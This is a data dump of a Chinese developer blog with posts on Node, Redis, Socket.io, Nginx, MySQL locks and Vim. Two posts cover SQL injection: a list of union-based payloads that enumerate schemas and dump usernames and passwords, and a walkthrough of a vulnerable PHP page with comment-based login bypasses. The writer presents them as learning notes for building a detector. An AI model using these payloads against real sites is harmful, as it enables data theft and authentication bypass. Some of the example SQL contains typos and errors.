46abe81345b1da2f1a330bba3d6254e110cd9ad8 Node中使用crypto进行md5 加密在PHP 中，如果需要获取某个字符串的md5 加密之后的哈希值，非常简单，直接使用md5 函数即可。 但是在node.js 中，并没有为我们直接提供这样的函数，所以需要手动调用crypto 模块去转换： 1234var pwd &#x3D; &quot;122410&quot;;var hash &#x3D; crypto.createHash(&#39;md5&#39;).update(pwd).digest(&#39;hex&#39;);&#x2F;&#x2F; 913975c2f972ba6bbf5ba593c68a5dc5 参考链接 如何在PHP中将hmac sha1密钥设置为十六进制？ 在线转换工具 php hash_hmac 函数 node.js crypto 模块","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/tags/Node/"},{"name":"Hash","slug":"Hash","permalink":"https://www.0x2beace.com/tags/Hash/"}]},{"title":"整理常见的 SQL 注入语句","slug":"organize-common-sql-injection-statements","date":"2020-07-22T15:30:04.000Z","updated":"2020-07-22T15:31:27.367Z","comments":true,"path":"organize-common-sql-injection-statements/","link":"","permalink":"https://www.0x2beace.com/organize-common-sql-injection-statements/","excerpt":"这篇笔记的目的是整理各种 SQL 注入使用时的payload。","text":"这篇笔记的目的是整理各种 SQL 注入使用时的payload。 说明：以下的payloads都基于单引号字符型注入。若是整型注入则把单引号和注释符（–+）去掉，若是双引号注入则把单引号换成双引号。 也就是基于这样一种情况： 1SELECT * FROM Student WHERE id &#x3D; &#39;1&#39;; Payload 判断当前数据表中有几列： 1?id&#x3D;1&#39; order by 数值 --+ 查看显示位在第几列： 1?id&#x3D;-1&#39; union select 1,2,3 --+ 注意：这里需要传递一个不存在的条件，比如：id=-1 显示当前数据库（假设显示位中包含第三位）： 1?id&#x3D;-1&#39; union select 1,2,database() --+ 查看当前数据库中的所有表： 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) --+ 函数group_concat()把所有结果都在一行输出 查询所有数据库： 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schema) --+ 查询某个数据库中的表： 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; --+ 查询某个表中的所有字段： 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; --+ 查询某个表中的字段内容 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(name, 0x3a, passwd) from security.users) 0x3a会被转义位冒号： UnionSQL UNION 操作符合并两个或多个 SELECT 语句的结果，需要注意的是：UNION 内部的每个 SELECT 语句必须拥有相同数量的列。 参考链接Web安全学习之数据库注入语句的收集和学习","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"Web 安全","slug":"Web-安全","permalink":"https://www.0x2beace.com/tags/Web-%E5%AE%89%E5%85%A8/"}]},{"title":"认识SQL 注入常见方式","slug":"know-common-ways-of-sql-injection","date":"2020-07-22T15:26:11.000Z","updated":"2020-07-22T15:29:48.375Z","comments":true,"path":"know-common-ways-of-sql-injection/","link":"","permalink":"https://www.0x2beace.com/know-common-ways-of-sql-injection/","excerpt":"最近需要做一个检测SQL 注入的功能，无奈发现自己于对SQL 注入竟有点陌生，本着搞清楚原理才能更好的理解Bug 产生的原因，于是便有了这篇笔记。","text":"最近需要做一个检测SQL 注入的功能，无奈发现自己于对SQL 注入竟有点陌生，本着搞清楚原理才能更好的理解Bug 产生的原因，于是便有了这篇笔记。 SQL 注入是什么？SQL 注入是一种将SQL 语句添加到REQUEST 参数中，传递到服务器并执行的一种攻击手段。 SQL 注入攻击是REQUEST 引數未经过过滤，然后直接拼接到SQL 语句中，解析并执行，而达到预想之外的一种行为。 SQL 注入是怎样产生的 WEB 开发人员无法保证所有的输入都已经完美过滤。 数据库未做安全配置，存在安全隐患。 如何进行SQL 注入这里以PHP、Mysql为例，介绍一下完整的SQL 注入攻击是如何产生的。 回显注入1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?php$db_host &#x3D; &quot;localhost&quot;;$db_user &#x3D; &quot;root&quot;;$db_pwd &#x3D; xxxxxx;$db_name &#x3D; &quot;User&quot;;$db_table &#x3D; &quot;Student&quot;;echo &#39;&lt;h1&gt;&#39;;echo &#39;Test ErrorBased Injections&#39;;echo &#39;&lt;&#x2F;h1&gt;&#39;;error_reporting(E_ALL ^ E_DEPRECATED);&#x2F;&#x2F; 测试连接$conn &#x3D; mysqli_connect($db_host, $db_user, $db_pwd);if (!$conn)&#123; echo &#39;Mysql 连接失败:&#39;.mysqli_error($conn);&#125;else &#123; echo &#39;Mysql 连接成功&#39;;&#125;echo &#39;&lt;hr&gt;&#39;;&#x2F;&#x2F;连接数据库mysqli_select_db($conn, $db_name) or die (&quot;无法连接到数据库: &quot;.$db_name);mysqli_query($conn, &#39;set names utf-8&#39;);&#x2F;&#x2F; 获取参数if(isset($_GET[&#39;id&#39;]))&#123; $id&#x3D;$_GET[&#39;id&#39;];&#125;&#x2F;&#x2F; 拼接SQL语句$sql&#x3D; &quot;SELECT * FROM $db_table WHERE id &#x3D; &#123;$id&#125; &quot;;echo &#39;查询SQL 语句:&#39;.$sql;echo &#39;&lt;hr&gt;&#39;;&#x2F;&#x2F;执行$result&#x3D;mysqli_query($conn, $sql);$row&#x3D;mysqli_fetch_array($result, MYSQLI_BOTH);if($row) &#123; echo &#39;Your Login name:&#39;.$row[&#39;username&#39;]; echo &#39;&lt;hr&gt;&#39;; echo &#39;Your Password:&#39;.$row[&#39;password&#39;];&#125;?&gt; 调用地址是http://127.0.0.1/sqli.php?id=1，使用GET传入参数id，输出的SQL 语句如下： 1SELECT * FROM Student WHERE id &#x3D; &#39;1&#39; 正常情况下，会返回id = 1 的学生信息。 1. 数字注入如果在浏览器中输入：http://127.0.0./sqli.php?id=1&#39; union select 1,2--+会怎样呢？输出的SQL 语句如下： 1SELECT * FROM Student WHERE id &#x3D; -1 or 1&#x3D;1 这会导致所有的学生信息都被输出了，为什么会这样呢？这是因为id = -1是一个不存在的条件，而1 = 1却是一个永远存在的条件，这就相当于没有加 Where 条件。 2. 字符串注入现在有这样一种场景：http://127.0.0./login.php模拟用户登录。假设正确的用户名和密码是Boo、122410，那么在正常的登录情况下所执行的SQL 语句如下： 1SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39; ADN password &#x3D; &#39;122410&#39; 由于用户名和密码都是字符串，所以SQL 注入会把参数携带的数据变成Mysql中的注释。Mysql 中的注释有两种。 1. #假设POST 传递的参数分别是：username = Boo&#39;#、password = xxxxxx，那么产生的SQL 语句则是： 1SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39;#&#39;ADN password &#x3D; &#39;xxxxxx&#39; 因为#号 后的所有字符串都会被当成注释来处理，所以上面的SQL 语句等价于： 1SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39; 2. --假设POST请求传递的参数分别是：username = Boo&#39;--、password = xxxxxx，那么产生的SQL 语句则是： 1SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39;-- &#39;AND password &#x3D; &#39;xxxxxx&#39; 因为--号 后面的所有内容都会被当成注释处理，所以上面的SQL 语句等价于： 1SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39; 无论是上面的哪一种情况，攻击者都能在不知道具体密码的情况下而成功登录。 这大概就是一个简单的SQL注入产生的完整过程了，这里只是抛砖引玉的介绍了下原理，而实际场景中的SQL 注入当然远远不止这两种。 参考链接SQL 注入常见方式以及检测方法","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"Web 安全","slug":"Web-安全","permalink":"https://www.0x2beace.com/tags/Web-%E5%AE%89%E5%85%A8/"}]},{"title":"Redis 常见事件整理","slug":"redis-common-events-collation","date":"2020-07-21T15:41:45.000Z","updated":"2020-07-21T15:42:45.608Z","comments":true,"path":"redis-common-events-collation/","link":"","permalink":"https://www.0x2beace.com/redis-common-events-collation/","excerpt":"这篇笔记用来整理 Redis 的常用事件。","text":"这篇笔记用来整理 Redis 的常用事件。 客户端事件客户端会发出一些事件的状态连接到Redis 服务器。 ReadyError客户端连接Redis 时，如果出现异常，则会触发Error 事件。 Connect客户端连接至Redis 时，会触发连接事件。 订阅者事件Message将接收到来自订阅频道的消息， 123client.on(&quot;message&quot;, function (channel, message) &#123; ...&#125;) Subscribe监听订阅事件，返回订阅频道的订阅数量。 123client.on(&quot;subscribe&quot;, function (channel, count) &#123; ...&#125;) 发布/订阅Publish将信息 message 发送到指定的频道 channel 。 返回值：接收到信息 message 的订阅者数量。 1PUBLISH channel message SUBSCRIBE订阅给定频道的信息。 返回值：接收到的信息。 1SUBSCRIBE channel [channel ...] 参考链接 Redis命令参考简体中文版 A high performance Node.js Redis client","categories":[{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/categories/Redis/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/tags/Redis/"}]},{"title":"Socket.io 快速上手","slug":"socket-io-quick-start","date":"2020-07-20T05:02:05.000Z","updated":"2020-07-20T05:04:22.840Z","comments":true,"path":"socket-io-quick-start/","link":"","permalink":"https://www.0x2beace.com/socket-io-quick-start/","excerpt":"最近使用socket.io 和 redis 完成了一些小功能，觉得很实用，所以整理一下socket.io相关的知识。","text":"最近使用socket.io 和 redis 完成了一些小功能，觉得很实用，所以整理一下socket.io相关的知识。 socket.io 是什么它是一个服务端与客户端之间建立通讯的工具。 服务端创建好服务之后，客户端通过主机与之建立连接。然后就可以进行通讯了。 想要使用好socket.io，一定要理解通讯的概念。通讯一定是双向的，如果客户端能够收到消息，那么在某个地方就一定存在服务端向客户端推送消息。 快速上手要开始使用socket.io进行开发，需要先安装Node和npm。 创建一个名为app.js的文件，并添加以下代码。 12345678910111213141516var app &#x3D; require(&#39;express&#39;)();var http &#x3D; require(&#39;http&#39;).Server(app);&#x2F;&#x2F; 创建一个附加到http服务器的新socket.io实例var io &#x3D; require(&#39;socket.io&#39;)(http);app.get(&#39;&#x2F;&#39;, function(req, res)&#123; res.sendFile(__dirname + &#39;&#x2F;index.html&#39;);&#125;);io.on(&#39;connection&#39;, function(socket)&#123; console.log(&#39;a user connected&#39;);&#125;);http.listen(3000, function()&#123; console.log(&#39;listening on *:3000&#39;);&#125;); 这样就完成了一个最简单的socket服务端。 创建index.html 文件来作为客户端提供服务。 1234567&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Hello world&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt;Hello world&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 启动服务 1node app.js 创建的服务运行在本地的 3000 端口上，打开浏览器，输入http://localhost:3000进行访问。 使用事件socket.io 的核心理念就是允许发送、接收任意事件和任意数据。任意能被编码为 JSON 的对象都可以用于传输。二进制数据 也是支持的。 在上面的代码中，我们已经创建了一个服务端的socket.io对象，如果想要能正常通讯，还需要在客户端同样也创建一个socket.io对象。这个脚本由服务端的/socket.io/socket.io.js 提供。 123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Hello world&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;script src &#x3D; &quot;&#x2F;socket.io&#x2F;socket.io.js&quot;&gt;&lt;&#x2F;script&gt; &lt;script&gt; var socket &#x3D; io(); &lt;&#x2F;script&gt; &lt;body&gt;Hello world&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 在客户端中建立 socket.io 连接。 在服务端中添加以下代码： 12345678910111213 ...&#x2F;&#x2F; 只有有客户端连接，就会触发这个事件io.on(&#39;connection&#39;, function(socket) &#123; console.log(&#39;A user connected&#39;); &#x2F;&#x2F; 只有有客户端断开连接，就会触发这个事件 socket.on(&#39;disconnect&#39;, function () &#123; console.log(&#39;A user disconnected&#39;); &#125;);&#125;); ... 现在再次访问http://localhost:3000，不仅可以在浏览器中看见hello world，如果刷新浏览器，还能在控制台中看见以下内容： 123A user connectedA user disconnectedA user connected 在上面的案例中，我们使用了socket.io的connection和disconnect事件，socket.io还有很多其中事件。 事件处理在服务端中有以下是保留字： Connect Message Disconnect Reconnect Ping Join and Leave 在客户端中以下是保留字： Connect Connect_error Connect_timeout Reconnect, etc 常用API客户端 提供的一些用于处理错误/异常的API。 1234567891011121314151617Connect − When the client successfully connects.Connecting − When the client is in the process of connecting.Disconnect − When the client is disconnected.Connect_failed − When the connection to the server fails.Error − An error event is sent from the server.Message − When the server sends a message using the send function.Reconnect − When reconnection to the server is successful.Reconnecting − When the client is in the process of connecting.Reconnect_failed − When the reconnection attempt fails. 广播广播意味着向所有连接的客户端发送消息。 要向所有客户端广播事件，我们可以使用io.sockets.emit方法。 12345678910111213 ...var clients &#x3D; 0;io.on(&#39;connection&#39;, function(socket) &#123; clients++; io.sockets.emit(&#39;broadcast&#39;,&#123; description: clients + &#39; clients connected!&#39;&#125;); socket.on(&#39;disconnect&#39;, function () &#123; clients--; io.sockets.emit(&#39;broadcast&#39;,&#123; description: clients + &#39; clients connected!&#39;&#125;); &#125;);&#125;); ... 广播在socket.io中应用的非常多，有广播就意味着有接收。需要在客户端中处理广播事件： 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Hello world&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;script src &#x3D; &quot;&#x2F;socket.io&#x2F;socket.io.js&quot;&gt;&lt;&#x2F;script&gt; &lt;script&gt; var socket &#x3D; io(); socket.on(&#39;broadcast&#39;,function(data) &#123; document.body.innerHTML &#x3D; &#39;&#39;; document.write(data.description); &#125;); &lt;&#x2F;script&gt; &lt;body&gt;Hello world&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 可以尝试打开多个浏览器，输入http://localhost:3000，可能会得到以下结果： 参考链接 Socket.io Tutorial","categories":[{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/categories/Node/"},{"name":"Socket.io","slug":"Node/Socket-io","permalink":"https://www.0x2beace.com/categories/Node/Socket-io/"}],"tags":[{"name":"Socket.io","slug":"Socket-io","permalink":"https://www.0x2beace.com/tags/Socket-io/"}]},{"title":"Nginx 常见配置","slug":"nginx-common-configuration","date":"2020-07-19T10:22:26.000Z","updated":"2020-07-19T10:24:25.144Z","comments":true,"path":"nginx-common-configuration/","link":"","permalink":"https://www.0x2beace.com/nginx-common-configuration/","excerpt":"最近接触Nginx 配置比较多，所以整理一下，方便后面回顾。","text":"最近接触Nginx 配置比较多，所以整理一下，方便后面回顾。 多站点配置如果一台服务器，需要配置多套站点，推荐使用 IP + 端口配置站点，然后使用反向代理指向端口。 站点配置 12345678910server &#123; listen 40001; location ~ \\.php &#123; ... &#125; location &#x2F; &#123; ... &#125;&#125; 多站点配置 123456789101112131415161718192021&#x2F;&#x2F; 站点1 server &#123; server_name yoursite.com; listen 80; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001; index index.html index.htm index.jsp index.js; &#125;&#125;&#x2F;&#x2F; 站点2server &#123; server_name yoursite2.com; listen 80; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001; index index.html index.htm index.jsp index.js; &#125;&#125; 反向代理反向代理其实已经在上面的配置中出现过了，多站点配置的原理就是利用反向代理。 123456789server &#123; server_name yoursite2.com; listen 80; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001; index index.html index.htm index.jsp index.js; &#125;&#125; SSL 配置申请好证书之后，将其放在服务器上，然后编辑Nginx 配置： 12345678910111213server &#123; server_name yoursite.com; listen 443 ssl; ssl on; ssl_certificate ssl_0123cp_net&#x2F;full_chain.pem; &#x2F;&#x2F; 证书所在路径 ssl_certificate_key ssl_0123cp_net&#x2F;private.key; &#x2F;&#x2F; 证书对应的私钥所在路径 location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001; index index.html index.htm index.jsp index.js; &#125;&#125; http重定向配置好 https之后，还需要做一件事，才能保证 https能够正常访问。 因为访问任何一个网站时，默认使用的是http协议，所以需要在Web Server中配置http 自动跳转 https。 123456server &#123; server_name yoursite.com; listen 80; rewrite ^(.*) https:&#x2F;&#x2F;$server_name$1 permanent;&#125;","categories":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/categories/Nginx/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"}]},{"title":"Mac 开启 Mysql 日志记录","slug":"mac-open-mysql-logging","date":"2020-07-19T09:24:43.000Z","updated":"2020-07-20T05:06:44.373Z","comments":true,"path":"mac-open-mysql-logging/","link":"","permalink":"https://www.0x2beace.com/mac-open-mysql-logging/","excerpt":"有时候可能会想在本地开启Mysql 的日志记录，看看具体都执行了哪些SQL，其实非常简单。","text":"有时候可能会想在本地开启Mysql 的日志记录，看看具体都执行了哪些SQL，其实非常简单。 进入Mysql 命令行 1mysql -hlocalhost -uroot -p 全局开启普通日志记录 1set global general_log&#x3D;on; 查看Mysql 日志文件所在目录 1show variables like &#39;general_log_file&#39;; 实时查看日志记录 1tail -f &#x2F;your_mysql_log_file_path","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"Mysql 行锁原因分析","slug":"analysis-of-the-causes-of-mysql-row-lock","date":"2020-07-19T09:03:04.000Z","updated":"2020-07-19T09:11:47.872Z","comments":true,"path":"analysis-of-the-causes-of-mysql-row-lock/","link":"","permalink":"https://www.0x2beace.com/analysis-of-the-causes-of-mysql-row-lock/","excerpt":"这篇文章来浅谈一下什么是Mysql 行锁，以及产生行锁的原因。","text":"这篇文章来浅谈一下什么是Mysql 行锁，以及产生行锁的原因。 锁的分类MySQL有三种锁的级别：页级、表级、行级。 表级锁：开销小，加锁快；不会出现死锁；锁定粒度大，发生锁冲突的概率最高,并发度最低。 行级锁：开销大，加锁慢；会出现死锁；锁定粒度最小，发生锁冲突的概率最低,并发度也最高。 页面锁：开销和加锁时间界于表锁和行锁之间；会出现死锁；锁定粒度界于表锁和行锁之间，并发度一般 因为这篇笔记只介绍Mysql 行锁，所以这里不对其他类型的锁做介绍了。 行锁InnoDB实现了两种类型的行锁: 共享锁【S锁】又称读锁，若事务T对数据对象A加上S锁，则事务T可以读A但不能修改A，其他事务只能再对A加S锁，而不能加X锁，直到T释放A上的S锁。这保证了其他事务可以读A，但在T释放A上的S锁之前不能对A做任何修改。 排他锁【X锁】又称写锁。若事务T对数据对象A加上X锁，事务T可以读A也可以修改A，其他事务不能再对A加任何锁，直到T释放A上的锁。这保证了其他事务在T释放A上的锁之前不能再读取和修改A。 所谓X锁,是事务T对数据A加上X锁时,只允许事务T读取和修改数据A; 所谓S锁,是事务T对数据A加上S锁时,其他事务只能再对数据A加S锁,而不能加X锁,直到T释放A上的S锁 场景重现 首先创建一个 InnoDB类型的数据表，SQL 如下： 1234CREATE TABLE &#96;gap&#96; ( &#96;id&#96; int(11) DEFAULT NULL, KEY &#96;ind_gap_id&#96; (&#96;id&#96;)) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8; 创建会话1，开启事务A并执行update 语句 12start transaction;update gap set id &#x3D; 30 where id &#x3D; 33; 创建会话2，开启事务B并执行另一个update 语句 12start transaction;update gap set id &#x3D; 22 where id &#x3D; 20; 在会话2中 插入20 &gt; id &lt; 39范围外的值时 可以执行成功,而当要插入 [20,39)范围内的值时 会遇到gap lock 。 用会话1 查看当前正在进行中的事务1SELECT * FROM information_schema.INNODB_TRX; 不会意外，能看到下面两条记录： 可以看到 进程id为3175 的事务在锁住了，而另一个id为3173的事务正在执行，但是没有提交事务。 这是因为执行update 语句之后，mysql 会执行索引扫描并在该表上施加一个 next-key lock ,向左扫描到20,向右扫描到39 ,锁定区间左闭右开,所以lock的范围是 [20,39)。 解决办法根据实际情况的不同，有不同的方式可以避免死锁，这里介绍常用的几种： 改变数据库操作逻辑，尽量避免在不同的事务中，对同一条记录进行更改。 如果不同程序会并发存取多个表，尽量约定以相同的顺序访问表，可以大大降低死锁机会。 参考链接 Mysql 死锁原因分析","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Mysql 查看死锁和解除死锁","slug":"mysql-view-deadlock-and-release-deadlock","date":"2020-07-19T08:07:48.000Z","updated":"2020-07-19T09:10:18.298Z","comments":true,"path":"mysql-view-deadlock-and-release-deadlock/","link":"","permalink":"https://www.0x2beace.com/mysql-view-deadlock-and-release-deadlock/","excerpt":"前段时间遇到了一个Mysql 死锁相关的问题，整理一下。","text":"前段时间遇到了一个Mysql 死锁相关的问题，整理一下。 问题描述：Mysql 的修改语句似乎都没有生效，同时使用Mysql GUI 工具编辑字段的值时会弹出异常。 什么是死锁在解决Mysql 死锁的问题之前，还是先来了解一下什么是死锁。 死锁是指两个或两个以上的进程在执行过程中,因争夺资源而造成的一种互相等待的现象,若无外力作用,它们都将无法推进下去.此时称系统处于死锁状态或系统产生了死锁,这些永远在互相等的进程称为死锁进程。 死锁的表现死锁的具体表现有两种： Mysql 增改语句无法正常生效 使用Mysql GUI 工具编辑字段的值时，会出现异常。 如何避免死锁阻止死锁的途径就是避免满足死锁条件的情况发生，为此我们在开发的过程中需要遵循如下原则： 1.尽量避免并发的执行涉及到修改数据的语句。 2.要求每一个事务一次就将所有要使用到的数据全部加锁，否则就不允许执行。 3.预先规定一个加锁顺序，所有的事务都必须按照这个顺序对数据执行封锁。如不同的过程在事务内部对对象的更新执行顺序应尽量保证一致。 查看死锁Mysql 查询是否存在锁表有多种方式，这里只介绍一种最常用的。 1. 查看正在进行中的事务1SELECT * FROM information_schema.INNODB_TRX 可以看到 进程id为3175 的事务在锁住了，而另一个id为3173的事务正在执行，但是没有提交事务。 2. 查看正在锁的事务1SELECT * FROM INFORMATION_SCHEMA.INNODB_LOCKS; 3. 查看等待锁的事务1SELECT * FROM INFORMATION_SCHEMA.INNODB_LOCK_WAITS; 4. 查询是否锁表1SHOW OPEN TABLES where In_use &gt; 0; 5. 查看最近死锁的日志1show engine innodb status 在发生死锁时，这几种方式都可以查询到和当前死锁相关的信息。 解除死锁如果需要解除死锁，有一种最简单粗暴的方式，那就是找到进程id之后，直接干掉。 查看当前正在进行中的进程。 1234show processlist&#x2F;&#x2F; 也可以使用SELECT * FROM information_schema.INNODB_TRX; 上面两个命令找出来的进程id 是同一个。 杀掉进程对应的进程 id 1kill id 验证（kill后再看是否还有锁） 1SHOW OPEN TABLES where In_use &gt; 0; 参考链接 Mysql 查看表和解锁表 Mysql 死锁是什么？","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"如何把 Console.log 的标准输出记录到文件","slug":"how-to-put-console-log-the-standard-output-of-is-recorded-to-a-file","date":"2020-07-18T08:16:51.000Z","updated":"2020-07-18T08:47:27.103Z","comments":true,"path":"how-to-put-console-log-the-standard-output-of-is-recorded-to-a-file/","link":"","permalink":"https://www.0x2beace.com/how-to-put-console-log-the-standard-output-of-is-recorded-to-a-file/","excerpt":"最近遇到了这样一个需求，在不改动之前的任何一行代码的前提下，如何把console.log的标准输出全部记录到文件中呢？","text":"最近遇到了这样一个需求，在不改动之前的任何一行代码的前提下，如何把console.log的标准输出全部记录到文件中呢？ 我是没有选择那些大名鼎鼎的日志模块，如： winston - A logger for just about everything. log4js - A port of log4js to node.js 因为我的需求够简单，只需要能把日志记录到文件就行，所以使用了下面这种最简单的方式： 12345678910111213141516var log_file &#x3D; fs.createWriteStream(path.resolve(__dirname, &quot;.pm2&quot;) + &#39;&#x2F;debug.log&#39;, &#123;flags : &#39;w&#39;&#125;);var log_stdout &#x3D; process.stdout;&#x2F;** * 重载console.log 函数 *&#x2F;console.log &#x3D; function() &#123; var res &#x3D; &quot;&quot;, len &#x3D; arguments.length; for(var i&#x3D;0; i&lt;len; i++)&#123; res +&#x3D; arguments[i]; &#125; log_file.write(util.format(res) + &#39;\\n&#39;); log_stdout.write(util.format(res) + &#39;\\n&#39;);&#125;; 参考链接 Node: log in a file instead of the console","categories":[{"name":"一些经验","slug":"一些经验","permalink":"https://www.0x2beace.com/categories/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/tags/Node/"}]},{"title":"解决Firefox “已阻止载入混合活动内容”","slug":"resolve-firefox-has-blocked-loading-of-mixed-active-content","date":"2020-07-18T07:15:30.000Z","updated":"2020-09-20T15:40:46.029Z","comments":true,"path":"resolve-firefox-has-blocked-loading-of-mixed-active-content/","link":"","permalink":"https://www.0x2beace.com/resolve-firefox-has-blocked-loading-of-mixed-active-content/","excerpt":"最近需要将项目迁移至一台新的服务器，其中涉及到多个站点的http与https之间的转换。 网站起初不能正常访问时，我没在意，以为是网络延迟（因为服务器放在国外），直到我打开控制台发现了如下异常：","text":"最近需要将项目迁移至一台新的服务器，其中涉及到多个站点的http与https之间的转换。 网站起初不能正常访问时，我没在意，以为是网络延迟（因为服务器放在国外），直到我打开控制台发现了如下异常： 这时我才意识到并不是网络延迟的问题，而是项目没有配置好。 什么是混合内容 当用户访问使用HTTPS的页面时，他们与web服务器之间的连接是使用SSL加密的，从而保护连接不受嗅探器和中间人攻击。如果HTTPS页面包括由普通明文HTTP连接加密的内容，那么连接只是被部分加密：非加密的内容可以被嗅探者入侵，并且可以被中间人攻击者修改，因此连接不再受到保护。当一个网页出现这种情况时，它被称为混合内容页面。 —— MDN 通俗一点解释就是：https 的页面中混合着http 的请求，而这种请求不会被浏览器正常接受的，也被称作为混合内容页面。 解决方案既然已经明白了为什么会产生这个问题，那么要解决起来也就非常简单了。 让Firefox暂时不阻止 打开新标签页，在地址栏输入 about:config，进入FireFox高级配置页面。 搜索security.mixed_content.block_active_content，将默认值true更改为false。 这种方式仅适用于本地调试。 避免在HTTPS页面中包含HTTP的内容更直接有效的方式应该是约定好项目中的协议，统一使用https或者http。 参考连接 什么是混合内容——MDN https访问遇到“已阻止载入混合内容”","categories":[{"name":"一些经验","slug":"一些经验","permalink":"https://www.0x2beace.com/categories/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"HTTPS","slug":"HTTPS","permalink":"https://www.0x2beace.com/tags/HTTPS/"},{"name":"HTTP","slug":"HTTP","permalink":"https://www.0x2beace.com/tags/HTTP/"}]},{"title":"Vim 安装 molokai 配色方案","slug":"vim-install-molokai-color-scheme","date":"2020-07-18T06:36:04.000Z","updated":"2020-07-18T06:38:53.741Z","comments":true,"path":"vim-install-molokai-color-scheme/","link":"","permalink":"https://www.0x2beace.com/vim-install-molokai-color-scheme/","excerpt":"像solarized、gruvbox、 molokai、这些都是大名鼎鼎的VIM 配色方案，本文只介绍如何安装 molokai 。","text":"像solarized、gruvbox、 molokai、这些都是大名鼎鼎的VIM 配色方案，本文只介绍如何安装 molokai 。 按照顺序执行完上面的命令，即可使用最经典的配色方案了。 1234567cd ~mkdir .vim &amp;&amp; cd .vimgit clone https:&#x2F;&#x2F;github.com&#x2F;tomasr&#x2F;molokai.gitcp -rf molokai&#x2F;colors&#x2F; .&#x2F;colorsecho colorscheme molokai &gt;&gt; ~&#x2F;.vimrcecho set t_Co&#x3D;256 &gt;&gt; ~&#x2F;.vimrcecho set background&#x3D;dark &gt;&gt; ~&#x2F;.vimrc 实际效果：","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Vim","slug":"Vim","permalink":"https://www.0x2beace.com/tags/Vim/"}]},{"title":"sshd_config 常用配置项","slug":"sshd-config-common-configuration-items","date":"2020-07-17T15:17:09.000Z","updated":"2020-07-17T15:18:28.234Z","comments":true,"path":"sshd-config-common-configuration-items/","link":"","permalink":"https://www.0x2beace.com/sshd-config-common-configuration-items/","excerpt":"这篇笔记用来收录那些常用的sshd_config配置项。","text":"这篇笔记用来收录那些常用的sshd_config配置项。 保持链接保持客户端与服务端之间的连接保持活动状态似乎是最常见策略。 ServerAliveInterval：客户端在向服务器发送空数据包之前（等待连接保持活动状态）将等待的秒数。 ClientAliveInterval：服务器在向客户端发送空数据包之前（等待连接保持活动状态）将等待的秒数。 设置为0（默认值）将禁用这些功能，因此如果空闲时间太长，连接可能会断开。 12345Host myhostshortcut HostName myhost.com User barthelemy ServerAliveInterval 60 ServerAliveCountMax 10 这么设置的作用是：客户端将等待空闲60秒钟（ServerAliveInterval时间），然后向服务器发送 no-op null数据包，并期待响应。 如果没有响应，则它将继续尝试上述过程直到10次（ServerAliveCountMax 次数 10 * 60 = 600秒）。如果服务器仍然没有响应，则客户端将断开ssh连接。 参考链接 如何让ssh客户端与服务端保持连接 